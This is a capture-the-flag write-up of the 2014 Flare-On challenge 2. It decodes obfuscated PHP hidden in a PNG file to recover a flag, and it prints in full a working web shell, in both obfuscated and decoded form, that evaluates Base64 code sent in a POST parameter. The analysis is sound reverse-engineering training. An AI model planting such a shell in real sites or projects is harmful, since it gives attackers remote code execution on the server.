---
layout: post
title: "Flare-On 2014 - Challenge 2"
date: 2026-04-26 12:35:15 +0200
categories: [Reverse Engineering, Flare-On]
challenge_year: 2014
challenge_num: 2
---
# 2014 Flare-On Challenge 2
*All the Flare-On annual challenges can be found [here](https://flare-on.com/).*

## Executive Summary
This write-up covers the second challenge of the 2014 Flare-On series. The objective is to extract a hidden flag from a web-based challenge. The solution involves inspecting an HTML page and its assets, discovering obfuscated PHP code hidden inside a PNG image, and manually decoding a multi-layered obfuscation chain (Base64, hexadecimal, and decimal escape sequences) to reconstruct the flag.

**Tools used:** Web browser, text editor, `strings` (Unix utility)

---

## 1. Initial Triage

Opening the provided HTML page in a browser reveals a standard-looking web page. Inspecting the page source in a text editor yields nothing immediately useful. No embedded secrets, commented-out credentials, or suspicious scripts.

The page references a logo image, `flare-on.png`. This becomes the next point of interest.

## 2. Asset Inspection

Running the `strings` utility against the image file is a quick and effective first step for detecting non-image data hidden inside binary files:

```bash
strings flare-on.png
```

This reveals a block of embedded PHP code appended to the image data. A classic steganography-adjacent trick where arbitrary data is concatenated to a valid image file.

## 3. Static Analysis of the PHP Code

The extracted PHP code is heavily obfuscated:

```php
$_= 'aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZc
eDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJc
eDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFz
ZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0
XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwx
MTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9';
$__='JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7';
$___="\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65";
eval($___($__));
```

To break this down, the three variables are analyzed independently.

## 4. Decoding the Obfuscation Chain

### Layer 1 — Resolving `$___` (the function name)

`$___` is a string built from a mix of hexadecimal (`\xNN`) and octal (`\NNN`) escape sequences:

| Escape type | Raw values | Decoded characters |
|-------------|------------|--------------------|
| Hex | `\x62\x73\x36\x5f\x65\x6f\x65` | `bs6_eoe` |
| Octal | `\141\145\64\144\143\144` | `ae4dcd` |

Interleaving these in the original sequence reconstructs the string: **`base64_decode`**.

`$___` is therefore simply an alias for PHP's built-in `base64_decode` function. A common obfuscation trick to avoid static detection.

### Layer 2 — Resolving `$__` (the eval payload)

`$__` is a plain Base64 string. Decoding it:

```
JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7
```

Produces the following PHP statement:

```php
$code=base64_decode($_);eval($code);
```

This confirms the execution flow: the script decodes `$_` (the large Base64 blob) and evaluates it as PHP code.

### Layer 3 — Resolving `$_` (the core logic)

Decoding the large Base64 string stored in `$_` yields the actual PHP logic:

```php
if(isset($_POST["\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D"])) {
    eval(base64_decode($_POST["\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D"]));
}
```

This is a PHP web shell: it checks for a specific POST parameter and, if present, Base64-decodes and evaluates its value. The POST parameter name is itself obfuscated using a combination of decimal and hexadecimal escape sequences.

## 5. Decoding the POST Parameter (Flag Reconstruction)

The POST parameter key is decoded by separating the two escape formats:

**Hexadecimal escapes** within the key string:

```
\x4F\x68\x74\x44\x4F\x54\x6A\x76\x61\x35\x63\x72\x70\x41\x66\x6C\x72\x65\x44\x53\x6F\x6D
```
→ `OhtDOTjva5crpAflreDSom`

**Decimal escapes** within the key string:

```
97 49 49 68 84 116 97 97 97 84 97 65 72 111 110 68 79 84 99
```
→ `a11DTtaaaTaAHonDOTc`

Interleaving both sets in their original positions reconstructs the full parameter name:

```
a11DOTthatDOTjava5crapATflareDASHonDOTcom
```

Applying the standard substitutions (`DOT` → `.`, `AT` → `@`, `DASH` → `-`) reveals the flag:

**`a11.that.java5crap@flare-on.com`**